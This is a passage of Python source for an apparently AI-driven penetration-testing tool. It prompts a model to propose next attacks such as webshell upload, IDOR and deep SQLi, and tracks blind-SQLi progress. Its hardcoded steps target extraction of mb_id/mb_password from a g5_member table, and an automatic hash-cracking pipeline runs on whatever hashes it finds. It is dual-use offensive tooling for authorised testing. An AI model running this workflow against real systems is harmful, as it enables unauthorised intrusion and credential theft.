                "아직 시도하지 않은 가능한 공격: 비밀번호 크랙, "
                "웹쉘 업로드, IDOR 권한 상승, SQLi 심화, API 엔드포인트 퍼징, "
                "ACPV(클라이언트 사이드 인증 우회 — localStorage/sessionStorage 조작, "
                "무인증 API 접근, Burp Suite 응답 변조)"
            ),
            "zh": (
                "尚未尝试的潜在攻击：密码破解、Webshell上传、"
                "IDOR权限提升、深度SQLi、API端点爆破、"
                "ACPV客户端认证绕过（localStorage/sessionStorage操控、"
                "未授权API访问、Burp响应篡改）"
            ),
            "en": (
                "Potentially untested: password cracking, webshell upload, "
                "IDOR privilege escalation, deep SQLi, API endpoint fuzzing, "
                "ACPV client-side auth bypass (localStorage/sessionStorage manipulation, "
                "unauthenticated API access, Burp Suite response manipulation)"
            ),
        }.get(_lang, "")

        prompt_msg = Message(
            role="user",
            content=(
                "[INTERACTIVE NEXT STEPS — PENTEST CONTINUATION]\n\n"
                f"Target: {_state.get('target', 'unknown')}\n"
                f"Current state: {_state}\n\n"
                f"Recent activity:\n{recent_context}\n\n"
                f"Hint — {_untested_hint}\n\n"
                f"INSTRUCTIONS (CRITICAL — follow EXACTLY):\n"
                f"1. Plain text ONLY. NO code blocks. NO markdown headers (#).\n"
                f"2. Respond ENTIRELY in {_lang_label}.\n"
                f"3. Output in EXACTLY this format (nothing else):\n\n"
                f"{_summary_label}: [1-2 sentences about current status]\n\n"
                f"{_options_label}:\n"
                f"1. [{_option_hint}]\n"
                f"2. [{_option_hint}]\n"
                f"3. [{_option_hint}]\n"
                f"4. [{_option_hint}]\n"
                f"5. [{_option_hint}]"
            )
        )

        temp_messages = [self._get_system_message("")] + self.history[-10:] + [prompt_msg]

        _after_report_title = _s.get("next_steps_after_report", "Report done — choose next step")
        self.console.print(Rule(
            f"[bold cyan]💡 {_after_report_title}[/bold cyan]",
            style="cyan"
        ))

        try:
            model = ModelRegistry.build(model_cfg)
            full = ""
            self.console.print(f"\n[{THEME['secondary']}]bingo[/] [{THEME['dim']}]▸[/]", end=" ")

            with Live(console=self.console, refresh_per_second=15, transient=True) as live:
                from rich.text import Text as _Text
                for chunk in model.chat_stream(temp_messages):
                    if chunk.error:
                        live.stop()
                        self._error(chunk.error)
                        return
                    if chunk.text:
                        full += chunk.text
                        live.update(_Text(full, style="white"))

            if not full.strip():
                return

            self.console.print()

            # ── 선택지 파싱 (1. ... / 2. ... / 3. ...) ──────────────
            lines = full.strip().splitlines()
            options: list[str] = []
            summary_lines: list[str] = []
            in_options = False

            for line in lines:
                stripped = line.strip()
                # 선택지 섹션 시작 감지
                _opt_markers = [
                    _s.get("next_steps_title", "Next Options"),
                    "Next Options", "다음 단계", "选择操作", "选项",
                ]
                if any(stripped.startswith(m) for m in _opt_markers):
                    in_options = True
                    continue
                if in_options:
                    # "1. xxx", "① xxx", "(1) xxx" 패턴 모두 허용
                    m = re.match(r'^[①②③④⑤1-5][\.\)]\s*(.+)$', stripped)
                    if m:
                        options.append(m.group(1).strip())
                    elif re.match(r'^[①②③④⑤]', stripped):
                        options.append(re.sub(r'^[①②③④⑤]\s*', '', stripped))
                elif stripped:
                    summary_lines.append(stripped)

            # 파싱 실패 시 번호 패턴으로 재시도 (전체 텍스트 대상)
            if not options:
                for line in lines:
                    m = re.match(r'^[①②③④⑤1-5][\.\)\s]+(.+)$', line.strip())
                    if m:
                        options.append(m.group(1).strip())

            # ── 출력 ──────────────────────────────────────────────────
            from rich.markup import escape as _esc

            # 요약 출력
            if summary_lines:
                summary_text = " ".join(summary_lines[:3])
                self.console.print(_Panel(
                    _esc(summary_text),
                    title=f"[{THEME['dim']}]{_summary_label}[/]",
                    border_style=THEME["dim"],
                    padding=(0, 2),
                ))

            if options:
                # 선택지 테이블
                tbl = _Table(
                    title=f"[bold cyan]{_options_label}[/bold cyan]",
                    border_style="cyan",
                    show_header=False,
                    padding=(0, 1),
                )
                tbl.add_column("No", style="bold cyan", width=4, justify="right")
                tbl.add_column("Action", style="white")
                for i, opt in enumerate(options, 1):
                    tbl.add_row(str(i), _esc(opt))
                self.console.print(tbl)
                self.console.print()

                # ── 번호 입력 대기 ────────────────────────────────────
                _prompt_txt = _s.get(
                    "next_steps_prompt",
                    "Enter number + Enter (0 = exit, other = type freely)"
                )
                self.console.print(
                    f"[bold cyan]▶[/bold cyan] [{THEME['dim']}]{_prompt_txt}[/]"
                )
                self.console.print()

                try:
                    raw = input("  > ").strip()
                except (EOFError, KeyboardInterrupt):
                    return

                if raw == "0" or raw == "":
                    self.console.print(
                        f"[{THEME['dim']}]{_s.get('next_steps_skipped', 'Skipped.')}[/]"
                    )
                    return

                if raw.isdigit() and 1 <= int(raw) <= len(options):
                    chosen = options[int(raw) - 1]
                    exec_msg = _s.get("next_steps_executing", "▶ Executing option {n}...").format(n=raw)
                    self.console.print(f"\n[bold cyan]{exec_msg}[/bold cyan]\n")
                    # 선택된 옵션을 일반 사용자 입력으로 처리
                    self._send_message(chosen)
                else:
                    # 숫자가 아니면 그대로 입력으로 처리
                    self._send_message(raw)
            else:
                # 파싱 실패 — 원문 그대로 패널로 표시
                self.console.print(_Panel(
                    _esc(full.strip()),
                    border_style="cyan",
                    padding=(1, 2),
                ))
                self.console.print()

        except Exception as e:
            self._error(f"next steps error: {e}")

    # ── 세션 이어하기 ────────────────────────────────────────────────

    def _history_path(self) -> "Path":
        return Path.home() / ".config" / "bingo" / "last_history.json"

    def _save_history(self) -> None:
        """현재 히스토리 + agent_state + auth_session → 파일 저장 (이어하기용)."""
        import json
        _path = self._history_path()
        try:
            _path.parent.mkdir(parents=True, exist_ok=True)
            data = {
                "history": [{"role": m.role, "content": m.content} for m in self.history[-30:]],
                "agent_state": self._agent_state,
                "loop_count": self._exec_loop_count,
                "auth_session": getattr(self, "_auth_session", {}),
                "last_exec_result": getattr(self, "_last_exec_result", ""),
            }
            _path.write_text(json.dumps(data, ensure_ascii=False, indent=2))
        except Exception:
            pass

    def _offer_resume(self) -> bool:
        """이전 세션이 있으면 이어하기 제안. 복원 성공 시 True 반환."""
        import json
        _path = self._history_path()
        if not _path.exists():
            return False
        try:
            data = json.loads(_path.read_text())
            hist = data.get("history", [])
            state = data.get("agent_state", {})
            target = state.get("target") or ""
            if not hist or not target:
                return False
        except Exception:
            return False

        _lang = getattr(self.config, "lang", "en")
        _labels = {
            "ko": ("이전 세션 발견", f"타겟: {target}", "이어서 작업하시겠습니까?", "계속 [Y/n]: "),
            "zh": ("发现上次会话", f"目标: {target}", "是否继续上次的工作？", "继续 [Y/n]: "),
            "en": ("Previous session found", f"Target: {target}", "Continue from where you left off?", "Resume [Y/n]: "),
        }
        title, tgt_label, question, prompt_str = _labels.get(_lang, _labels["en"])

        from rich.panel import Panel
        self.console.print(Panel(
            f"[bold]{tgt_label}[/bold]\n{question}",
            title=f"[bold cyan]🔄 {title}[/bold cyan]",
            border_style="cyan",
        ))

        try:
            ans = input(prompt_str).strip().lower()
        except Exception:
            ans = "n"

        if ans in ("", "y", "yes"):
            # 히스토리 복원
            self.history = [
                Message(role=m["role"], content=m["content"])
                for m in hist
                if m.get("role") in ("user", "assistant", "system")
            ]
            self._agent_state = {**self._agent_state, **data.get("agent_state", {})}
            self._exec_loop_count = data.get("loop_count", 0)
            # auth_session 복원
            saved_auth = data.get("auth_session", {})
            if saved_auth.get("active"):
                self._auth_session = saved_auth
            # 마지막 실행 결과 복원 (retry용)
            self._last_exec_result = data.get("last_exec_result", "")

            _resumed = {
                "ko": f"✅ 이전 세션 복원 완료 — 타겟: {target}",
                "zh": f"✅ 已恢复上次会话 — 目标: {target}",
                "en": f"✅ Session restored — target: {target}",
            }.get(_lang, f"✅ Session restored: {target}")
            self.console.print(f"[bold green]{_resumed}[/bold green]\n")
            return True   # 복원 성공 — 자동 재개 신호
        else:
            # 새 세션 시작 — 기존 히스토리 파일 삭제
            try:
                _path.unlink()
            except Exception:
                pass
            return False

    def _load_agent_state(self) -> dict:
        """저장된 agent_state 로드. 없으면 빈 상태 반환."""
        import json
        default = {
            "target": None, "waf": None,
            "bool_true_len": None, "bool_false_len": None,
            "db_name": None, "tables": [], "columns": {},
            "credentials": [], "confirmed_sqli": False, "notes": [],
        }
        try:
            if self._agent_state_path.exists():
                return {**default, **json.loads(self._agent_state_path.read_text())}
        except Exception:
            pass
        return default

    def _save_agent_state(self) -> None:
        """agent_state를 파일에 저장."""
        import json
        try:
            self._agent_state_path.parent.mkdir(parents=True, exist_ok=True)
            self._agent_state_path.write_text(
                json.dumps(self._agent_state, ensure_ascii=False, indent=2)
            )
        except Exception:
            pass

    def _reset_agent_state(self) -> None:
        """새 타겟 시작 시 agent_state 초기화."""
        self._agent_state = {
            "target": None, "waf": None,
            "bool_true_len": None, "bool_false_len": None,
            "db_name": None, "tables": [], "columns": {},
            "credentials": [], "confirmed_sqli": False, "notes": [],
        }
        self._save_agent_state()

    def _parse_agent_state(self, text: str) -> None:
        """실행 결과 텍스트에서 주요 사실 파싱 → _agent_state에 누적."""
        import re

        # Boolean 기준값
        m = re.search(r"[Tt]rue[:\s=]+(\d+).*?[Ff]alse[:\s=]+(\d+)", text)
        if m and not self._agent_state["bool_true_len"]:
            self._agent_state["bool_true_len"] = int(m.group(1))
            self._agent_state["bool_false_len"] = int(m.group(2))

        # DB 이름
        m = re.search(r"[Dd]atabase(?:\s+name|:)?\s*[:\-=]?\s*([a-zA-Z0-9_]+)", text)
        if m and not self._agent_state["db_name"] and len(m.group(1)) > 1:
            self._agent_state["db_name"] = m.group(1)
        # "dbbarun" 패턴 직접 탐지
        m2 = re.search(r"(?:Database confirmed|DB name):\s*([a-zA-Z0-9_]+)", text)
        if m2:
            self._agent_state["db_name"] = m2.group(1)

        # Boolean SQLi 확인
        if re.search(r"[Bb]oolean.{0,30}[Ll]ikely|[Ss]QLi.{0,20}[Cc]onfirmed", text):
            self._agent_state["confirmed_sqli"] = True

        # 테이블 목록
        m = re.search(r"[Ff]ound tables?:\s*\[([^\]]+)\]", text)
        if m:
            tables = [t.strip().strip("'\"") for t in m.group(1).split(",") if t.strip().strip("'\"")]
            for t in tables:
                if t and t not in self._agent_state["tables"]:
                    self._agent_state["tables"].append(t)

        # 개별 테이블 존재 확인
        for t in re.findall(r"\[\+\] Table exists(?:: |\()([a-zA-Z0-9_]+)", text):
            if t not in self._agent_state["tables"]:
                self._agent_state["tables"].append(t)

        # 컬럼 목록
        m = re.search(r"[Vv]alid columns?:\s*\[([^\]]+)\]", text)
        if m:
            cols = [c.strip().strip("'\"") for c in m.group(1).split(",")]
            db = self._agent_state["db_name"] or "unknown"
            if "g5_member" not in self._agent_state["columns"]:
                self._agent_state["columns"]["g5_member"] = []
            for c in cols:
                if c and c not in self._agent_state["columns"]["g5_member"]:
                    self._agent_state["columns"]["g5_member"].append(c)

        # 자격증명
        cred_match = re.findall(
            r"(mb_id|mb_password|username|password)[:\s=]+([^\n\r,\]]{3,80})", text, re.IGNORECASE
        )
        if cred_match:
            cred = {k.lower(): v.strip() for k, v in cred_match
                    if v.strip() and "~" not in v and "?" not in v and len(v.strip()) > 2}
            if cred:
                self._agent_state["credentials"].append(cred)

        # WAF
        m = re.search(r"WAF.*?detected.*?([Cc]loudflare|[Aa]WS|[Mm]od[Ss]ecurity|[Ww]ordfence)", text)
        if m:
            self._agent_state["waf"] = m.group(1)

        # 변경 시 자동 저장
        self._save_agent_state()

    # ── 스킬 시스템 (에이전트 자율 판단) ─────────────────────────
    @staticmethod
    def _format_db_skill(sid: str, sk: dict) -> str:
        """skills_data 항목 → 마크다운 텍스트"""
        lines = [f"### {sk['name']} [{sid}]",
                 f"**{sk.get('desc', '')}**"]
        if sk.get("tools"):
            lines.append(f"Tools: {', '.join(sk['tools'])}")
        if sk.get("commands"):
            lines.append("Commands:")
            for cmd in sk["commands"][:6]:
                lines.append(f"  `{cmd}`")
        if sk.get("payloads"):
            lines.append("Payloads:")
            for p in sk["payloads"][:8]:
                lines.append(f"  - {p}")
        if sk.get("notes"):
            lines.append(f"Notes: {sk['notes']}")
        return "\n".join(lines)

    def _load_skill_content(self, skill_names: list[str]) -> str:
        """지정된 스킬 파일을 읽어 내용 반환.

        검색 순서:
          1. skills/{name}/SKILL.md  (내장 6종)
          2. skills/hack-skills/{name}/SKILL.md  (102종)
          3. skills/local_skills/{name}/SKILL.md  (5종)
          4. hack-skills 부분 이름 매칭
          5. skills_data DB 모듈명 매칭 (235종 — Exploitation, Recon, …)
          6. skills_data DB 태그/이름 부분 매칭
        """
        from pathlib import Path
        skills_dir = Path(__file__).parent.parent / "skills"
        loaded = []
        contents = []

        # ── skills_data 통합 로드 (lazy, 한 번만) ─────────────────
        try:
            from ..skills.skills_data import SKILLS_DB
            from ..skills.skills_data2 import SKILLS_DB_2
            from ..skills.skills_data3 import SKILLS_DB_3
            _all_db: dict = {**SKILLS_DB, **SKILLS_DB_2, **SKILLS_DB_3}
        except Exception:
            _all_db = {}

        for name in skill_names:
            name_clean = name.strip()
            name_lower = name_clean.lower()

            # ── 1~3: SKILL.md 파일 검색 ───────────────────────────
            candidates = [
                skills_dir / name_lower / "SKILL.md",
                skills_dir / "hack-skills" / name_lower / "SKILL.md",
                skills_dir / "hack-skills" / name_clean / "SKILL.md",
                skills_dir / "local_skills" / name_lower / "SKILL.md",
                skills_dir / "local_skills" / name_clean / "SKILL.md",
            ]
            found_file = None
            for p in candidates:
                if p.exists():
                    found_file = p
                    break

            if found_file:
                content = found_file.read_text(encoding="utf-8")
                contents.append(
                    f"=== SKILL: {name_clean.upper()} ===\n{content}\n=== END SKILL: {name_clean.upper()} ==="
                )
                loaded.append(name_clean)
                continue

            # ── 4: hack-skills 부분 이름 매칭 ─────────────────────
            hs_dir = skills_dir / "hack-skills"
            hs_match = None
            if hs_dir.exists():
                for d in sorted(hs_dir.iterdir()):
                    if d.is_dir() and (name_lower in d.name.lower() or d.name.lower() in name_lower):
                        sf = d / "SKILL.md"
                        if sf.exists():
                            hs_match = sf
                            break
            if hs_match:
                content = hs_match.read_text(encoding="utf-8")
                label = hs_match.parent.name.upper()
                contents.append(f"=== SKILL: {label} ===\n{content}\n=== END SKILL: {label} ===")
                loaded.append(hs_match.parent.name)
                continue

            # ── 5: skills_data DB 모듈명 매칭 ─────────────────────
            if _all_db:
                mod_matches = [
                    (sid, sk) for sid, sk in _all_db.items()
                    if sk.get("module", "").lower() == name_lower
                    or sk.get("module", "").lower().replace(" ", "") == name_lower.replace(" ", "")
                    or name_lower in sk.get("module", "").lower()
                ]
                if mod_matches:
                    mod_name = mod_matches[0][1].get("module", name_clean)
                    block = [f"=== SKILL MODULE: {mod_name.upper()} ({len(mod_matches)} skills) ==="]
                    for sid, sk in mod_matches:
                        block.append(self._format_db_skill(sid, sk))
                    block.append(f"=== END SKILL MODULE: {mod_name.upper()} ===")
                    contents.append("\n\n".join(block))
                    loaded.append(f"{mod_name}({len(mod_matches)})")
                    continue

                # ── 6: 태그/이름 부분 매칭 (최대 5개) ───────────────
                tag_matches = [
                    (sid, sk) for sid, sk in _all_db.items()
                    if name_lower in sk.get("name", "").lower()
                    or any(name_lower in t for t in sk.get("tags", []))
                ]
                if tag_matches:
                    block = [f"=== SKILL SEARCH: {name_clean.upper()} ({len(tag_matches[:5])} matches) ==="]
                    for sid, sk in tag_matches[:5]:
                        block.append(self._format_db_skill(sid, sk))
                    block.append(f"=== END SKILL SEARCH: {name_clean.upper()} ===")
                    contents.append("\n\n".join(block))
                    loaded.append(f"{name_clean}(db-match)")
                    continue

        if loaded:
            self.console.print(
                f"[bold cyan]⚡ {self.s.get('skill_loaded', 'Skills loaded')}: {', '.join(loaded)}[/bold cyan]"
            )
        return "\n\n".join(contents)

    def _parse_skill_load_request(self, ai_response: str) -> list[str]:
        """AI 응답에서 SKILL_LOAD: 요청을 파싱. 요청된 스킬 이름 리스트 반환."""
        import re
        m = re.search(r"SKILL_LOAD:\s*([^\n]+)", ai_response)
        if not m:
            return []
        raw = m.group(1)
        skills = [s.strip() for s in re.split(r"[,\s]+", raw) if s.strip()]
        return skills

    def _detect_and_load_skills(self, text: str) -> str:
        """사용자 입력 키워드 기반 초기 스킬 로드 (첫 메시지 한정).
        이후는 AI가 SKILL_LOAD:로 자율 판단.
        """
        return ""  # 이제 AI가 직접 판단 — 키워드 자동 로드 비활성화

    def _format_agent_state(self) -> str:
        """agent_state를 AI에게 주입할 요약 문자열로 변환."""
        s = self._agent_state
        lines = ["=== AGENT ACCUMULATED KNOWLEDGE (DO NOT RE-EXTRACT) ==="]

        if s["confirmed_sqli"]:
            lines.append("✅ SQLi: CONFIRMED (boolean blind)")
        if s["bool_true_len"]:
            lines.append(f"✅ Boolean baseline: TRUE={s['bool_true_len']}B, FALSE={s['bool_false_len']}B (use this, do NOT re-calibrate)")
        if s["waf"]:
            lines.append(f"✅ WAF: {s['waf']}")
        if s["db_name"]:
            lines.append(f"✅ Database: {s['db_name']} (confirmed, do NOT extract again)")
        if s["tables"]:
            lines.append(f"✅ Tables: {', '.join(s['tables'])} (confirmed, do NOT re-enumerate)")
        if s["columns"]:
            for tbl, cols in s["columns"].items():
                lines.append(f"✅ Columns ({tbl}): {', '.join(cols)}")
        if s["credentials"]:
            lines.append(f"✅ Credentials found: {s['credentials']}")
            lines.append("⚡ NEXT: crack/verify these credentials")
        else:
            if s["columns"]:
                lines.append("⚡ NEXT: extract actual DATA from g5_member (mb_id, mb_password)")
            elif s["tables"]:
                lines.append("⚡ NEXT: enumerate columns in g5_member")
            elif s["db_name"]:
                lines.append("⚡ NEXT: enumerate tables in " + s["db_name"])
            elif s["confirmed_sqli"]:
                lines.append("⚡ NEXT: extract database name")

        lines.append("=== END KNOWLEDGE ===\n")
        return "\n".join(lines) + "\n"

    def _notify_hashes_found(self, text: str) -> None:
        """AI 응답에서 해시 감지 시 자동 온라인 조회 → 오프라인 크랙 파이프라인 실행
        (컨텍스트 필터: 오류코드/추적ID 등 비밀번호 해시가 아닌 hex 문자열 자동 제외)
        """
        from ..tools.hash_crack import extract_hashes_from_text
        # strict=True: 오류코드/추적ID/HTTP에러페이지 hex 자동 필터링
        raw_hashes = extract_hashes_from_text(text, strict=False)   # 필터 전
        hashes     = extract_hashes_from_text(text, strict=True)    # 필터 후
        # 필터링된 항목이 있으면 사용자에게 알림
        filtered_out = [h for h in raw_hashes if h not in hashes]
        if filtered_out:
            _lang = getattr(self.config, "lang", "en")
            _msg = {
                "ko": f"[dim]🔍 오탐 제외: {len(filtered_out)}개 hex 문자열이 오류코드/추적ID로 판단되어 크랙 건너뜀[/dim]",
                "zh": f"[dim]🔍 误报过滤: {len(filtered_out)}个十六进制字符串被识别为错误码/追踪ID，已跳过破解[/dim]",
                "en": f"[dim]🔍 False-positive filter: {len(filtered_out)} hex string(s) skipped (error code / tracking ID detected)[/dim]",
            }.get(_lang, f"[dim]🔍 Filtered {len(filtered_out)} non-hash hex string(s)[/dim]")
            self.console.print(_msg)
        if not hashes:
            # 크레덴셜 발견 키워드 감지 → 크리티컬 알림
            _cred_signals = [
                "password:", "username:", "admin:", "passwd=", "pw=",
                "크레덴셜", "비밀번호 발견", "credential found", "凭据", "密码"
            ]
            if any(s in text.lower() for s in _cred_signals):
                _lang = getattr(self.config, "lang", "en")
                _t = {"ko": "🚨 BINGO — 크레덴셜 발견!", "zh": "🚨 BINGO — 发现凭据!", "en": "🚨 BINGO — Credential Found!"}.get(_lang, "🚨 BINGO — Critical!")
                _b = {"ko": "관리자 자격증명이 발견되었습니다.", "zh": "发现了管理员凭据。", "en": "Admin credentials have been found."}.get(_lang, "Credential found.")
                self._send_notification(_t, _b, critical=True)
            return
        self.console.print(
            f"\n[{THEME['warn']}]{self.s['hash_found'].format(n=len(hashes))}[/]"
        )
        # 해시 발견 → 크리티컬 알림
        _lang = getattr(self.config, "lang", "en")
        _ht = {"ko": f"🔑 BINGO — 해시 {len(hashes)}개 발견!", "zh": f"🔑 BINGO — 发现 {len(hashes)} 个哈希!", "en": f"🔑 BINGO — {len(hashes)} hash(es) found!"}.get(_lang, f"🔑 {len(hashes)} hashes found")
        _hb = {"ko": "자동 크랙 시작됨", "zh": "自动破解已启动", "en": "Auto-crack started"}.get(_lang, "Auto-crack started")
        self._send_notification(_ht, _hb, critical=True)
        # 별도 스레드에서 실행 (채팅 블로킹 방지)
        self._stop_crack_flag.clear()
        t = threading.Thread(
            target=self._auto_crack_pipeline,
            args=(hashes,),
            daemon=True,
        )
        t.start()

    def _auto_crack_pipeline(self, hashes: list[str]) -> None:
        """
        자동 크랙 파이프라인 (백그라운드 스레드)
        Step 1: 온라인 해시 조회 (여러 사이트 순서대로)
        Step 2: 미해결 해시 → 오프라인 크랙 (john/hashcat/python)
        /stop 입력 시 즉시 중단
        """
        from ..tools.hash_lookup import OnlineHashLookup, LookupResult
        from ..tools.hash_crack import HashCracker
        from rich.table import Table as RichTable

        def log(msg: str) -> None:
            if not self._stop_crack_flag.is_set():
                self.console.print(f"[{THEME['dim']}]{msg}[/]")

        cracked: dict[str, str] = {}   # hash → plaintext
        pending = list(hashes)

        # ── Step 1: 온라인 조회 ──────────────────────────────────────
        self.console.print(f"[{THEME['secondary']}]  {self.s['hash_online']}[/]")

        def log_visible(msg: str) -> None:
            """온라인 조회 진행 상황 실시간 출력"""
            if self._stop_crack_flag.is_set():
                return
            # 중요 메시지는 컬러로 강조
            if "✓" in msg or "crackstation" in msg.lower() or "hashes.com" in msg.lower():
                self.console.print(f"  [{THEME['dim']}]{msg}[/]")
            elif "⚠" in msg or "불가" in msg or "불가능" in msg or "no_online" in msg.lower():
                self.console.print(f"  [{THEME['warn']}]{msg}[/]")
            elif "→" in msg:
                self.console.print(f"  [{THEME['secondary']}]{msg}[/]")
            else:
                self.console.print(f"  [{THEME['dim']}]{msg}[/]")

        lookup = OnlineHashLookup(on_progress=log_visible)

        for h in list(pending):
            if self._stop_crack_flag.is_set():
                self.console.print(f"[{THEME['warn']}]{self.s['hash_stopped']}[/]")
                return
            h_safe = h.replace("[", r"\[").replace("*", r"\*")
            self.console.print(
                f"  [{THEME['dim']}]{self.s['hash_checking']}: {h_safe[:35]}...[/]"
            )
            result: LookupResult = lookup.lookup(h)
            if result.found and result.plaintext:
                cracked[h] = result.plaintext
                self.console.print(
                    f"  [{THEME['success']}]✓ [{result.source}] "
                    f"{h_safe[:30]}... → [bold]{result.plaintext}[/bold][/]"
                )
                pending.remove(h)
            elif result.error == "bcrypt_no_online":
                self.console.print(
                    f"  [{THEME['warn']}]{self.s['hash_bcrypt_no_online']}[/]"
                )
            else:
                self.console.print(
                    f"  [{THEME['dim']}]{self.s['hash_online_not_found']}[/]"
                )

        # ── Step 2: 오프라인 크랙 ────────────────────────────────────
        if pending and not self._stop_crack_flag.is_set():
            self.console.print(
                f"[{THEME['secondary']}]  {self.s['hash_offline'].format(n=len(pending))}[/]"
            )
            cracker = HashCracker(on_progress=log)

            for h in list(pending):
                if self._stop_crack_flag.is_set():
                    self.console.print(f"[{THEME['warn']}]{self.s['hash_stopped']}[/]")
                    break
                result = cracker.crack(h)
                if result.cracked and result.plaintext:
                    cracked[h] = result.plaintext
                    self.console.print(
                        f"  [{THEME['success']}]{self.s['hash_offline_ok'].format(method=result.method, h=h[:30], plain=result.plaintext)}[/]"
                    )
                    pending.remove(h)
                else:
                    err = result.error or self.s["hash_manual_unsolved"]
                    self.console.print(
                        f"  [{THEME['dim']}]{self.s['hash_offline_fail'].format(h=h[:30], err=err)}[/]"
                    )

        # ── 결과 테이블 ──────────────────────────────────────────────
        if self._stop_crack_flag.is_set() and not cracked:
            return

        table = RichTable(
            title=f"[{THEME['primary']}]{self.s['hash_result_title']}[/]",
            border_style=THEME["primary"],
        )
        table.add_column(self.s["hash_col_hash"], style=THEME["dim"])
        table.add_column(self.s["hash_col_plain"], style=f"bold {THEME['error']}")
        table.add_column(self.s["hash_col_method"], style=THEME["dim"])

        for h in hashes:
            # Rich 마크업 * 이스케이프 처리
            h_display = h.replace("[", r"\[").replace("*", r"\*")
            if h in cracked:
                table.add_row(h_display, cracked[h], "✓")
            else:
                disp = h_display[:40] + ("..." if len(h) > 40 else "")
                table.add_row(disp, f"[dim]{self.s['hash_unsolved']}[/dim]", "✗")

        self.console.print(table)

        # 세션 로그에 저장
        if cracked:
            lines = ["## 🔓 자동 크랙 결과\n"]
            for h, p in cracked.items():
                lines.append(f"- `{h}` → **{p}**\n")
            self._append_to_session_log("assistant", "".join(lines))

        self.console.print(
            f"[{THEME['dim']}]{self.s['hash_done']}[/]"
        )

    def _cmd_crack(self, arg: str = "") -> None:
        """
        /crack <hash>          — 단일 해시 크랙
        /crack                 — 최근 AI 응답에서 해시 자동 추출 후 크랙
        /crack --wordlist /path/to/list.txt <hash>
        """
        from ..tools.hash_crack import HashCracker, extract_hashes_from_text, detect_hash_type
        from rich.table import Table as RichTable

        wordlist = None
        hashes: list[str] = []

        # 인자 파싱
        tokens = arg.split()
        i = 0
        while i < len(tokens):
            if tokens[i] in ("--wordlist", "-w") and i + 1 < len(tokens):
                wordlist = tokens[i + 1]
                i += 2
            else:
                hashes.append(tokens[i])
                i += 1

        # 인자 없으면 최근 AI 응답에서 자동 추출
        if not hashes:
            last_ai = next(
                (m.content for m in reversed(self.history) if m.role == "assistant"),
                None,
            )
            if last_ai:
                hashes = extract_hashes_from_text(last_ai)

        if not hashes:
            self.console.print(
                f"[{THEME['warn']}]{self.s['hash_none']}[/]\n"
                f"[{THEME['dim']}]{self.s['hash_usage']}[/]"
            )
            return

        self.console.print(
            f"\n[{THEME['warn']}]{self.s['hash_start'].format(n=len(hashes))}[/]\n"
        )
        self._stop_crack_flag.clear()
        # 워드리스트 지정 시 HashCracker에 직접 전달해 실행 (동기)
        if wordlist:
            from ..tools.hash_crack import HashCracker
            cracker = HashCracker(
                wordlist=wordlist,
                on_progress=lambda m: self.console.print(f"[{THEME['dim']}]{m}[/]"),
            )
            for h in hashes:
                if self._stop_crack_flag.is_set():
                    break
                r = cracker.crack(h)
                if r.cracked:
                    self.console.print(
                        f"  [{THEME['success']}]✓ {h[:30]}... → [bold]{r.plaintext}[/bold][/]"
                    )
                else:
                    self.console.print(f"  [{THEME['dim']}]✗ {h[:30]}... {self.s['hash_manual_unsolved']}[/]")
        else:
            # 파이프라인 (온라인 → 오프라인)
            self._auto_crack_pipeline(hashes)

    # ── /install exe-deps (Playwright style) ─────────────────────────────
    def _cmd_install_exe_deps(self) -> None:
        """
        Playwright-style EXE dependency installer.
        Shows status of each dep, installs missing ones.
        """
        from ..tools.exe_analyzer import (  # noqa: PLC0415
            ensure_exe_deps, _load_optional_deps, _DEPS_CHECKED,
        )
        import bingo.tools.exe_analyzer as _exe_mod  # noqa: PLC0415

        self.console.print()
        self.console.print(
            f"[{THEME['success']}]  bingo — EXE Phase 0 Dependencies[/]"
        )
        self.console.print()

        # Force re-check so status is always shown fresh
        _exe_mod._DEPS_CHECKED = False
        result = ensure_exe_deps(silent=True)   # we print our own rich output below
        _load_optional_deps()

        labels = {
            "pefile":   ("pefile",       "PE header parsing",       True),
            "lief":     ("lief",         "PE/ELF/Mach-O rich API",  False),
            "yara":     ("yara-python",  "YARA rule scanning",      False),
            "ssdeep":   ("ssdeep",       "Fuzzy hashing (ssdeep)",  False),
            "requests": ("requests",     "VirusTotal lookup",       False),
        }
        for import_name, (pip_name, desc, required) in labels.items():
            ok = result.get(import_name, False)
            tag = "" if required else f"  [{THEME['dim']}](optional)[/]"
            if ok:
                icon = f"[{THEME['success']}]✅  already installed[/]"
            else:
                icon = f"[{THEME['warn']}]📦  installed now    [/]"
            self.console.print(
                f"    {icon}  [white]{pip_name:<18}[/] [{THEME['dim']}]{desc}[/]{tag}"
            )

        self.console.print()
        all_ready = all(result.values())
        if all_ready:
            self.console.print(
                f"[{THEME['success']}]  ✅  All EXE Phase 0 dependencies are ready![/]\n"
            )
        else:
            missing = [
                labels[k][0] for k, v in result.items() if not v and k in labels
            ]
            self.console.print(
                f"[{THEME['warn']}]  ⚠   Some dependencies could not be installed:[/]"
            )
            for m in missing:
                self.console.print(f"      pip install {m}")
            self.console.print()

    def _cmd_tools(self, arg: str = "") -> None:
        from ..tools.registry import ToolRegistry
        from ..tools.executor import _GO_TOOLS, _PKG_TOOLS

        # ── /tools install <name|all> ────────────────────────────────
        tokens = arg.split()
        if tokens and tokens[0].lower() in ("install", "add"):
            targets = tokens[1:] if len(tokens) > 1 else []
            if not targets:
                self._warn(self.s["tools_usage_hint"])
                return
            if targets == ["all"]:
                missing = [t.name for t in ToolRegistry.missing_tools()]
                targets = missing

            self.console.print(f"\n[{THEME['warn']}]{self.s['tools_auto_install']}: {', '.join(targets)}[/]\n")
            for tool_name in targets:
                self._install_tool_interactive(tool_name)
            return

        # ── 도구 현황 테이블 ────────────────────────────────────────
        self.console.print()
        all_tools = ToolRegistry.scan_all()
        available_cnt = sum(1 for i in all_tools.values() if i.available)
        missing_list = [(n, i) for n, i in all_tools.items() if not i.available]

        table = Table(
            title=f"[{THEME['primary']}]{self.s['tools_title'].format(a=available_cnt, t=len(all_tools))}[/]",
            border_style=THEME["primary"],
        )
        table.add_column("#", style=THEME["dim"], width=3)
        table.add_column(self.s["tools_col_tool"], style=THEME["secondary"])
        table.add_column(self.s["tools_col_type"], style=THEME["dim"])
        table.add_column(self.s["tools_col_status"], justify="center")
        table.add_column(self.s["tools_col_version"], style=THEME["dim"])

        _type_label = {
            **{t: "Go Binary" for t in _GO_TOOLS},
            **{t: "pkg-mgr" for t in _PKG_TOOLS},
            "sqlmap": "Python", "wafw00f": "Python",
            "curl": "builtin", "python3": "builtin",
        }

        for i, (name, info) in enumerate(all_tools.items(), 1):
            typ = _type_label.get(name, "tool")
            if info.available:
                table.add_row(
                    str(i), name, typ,
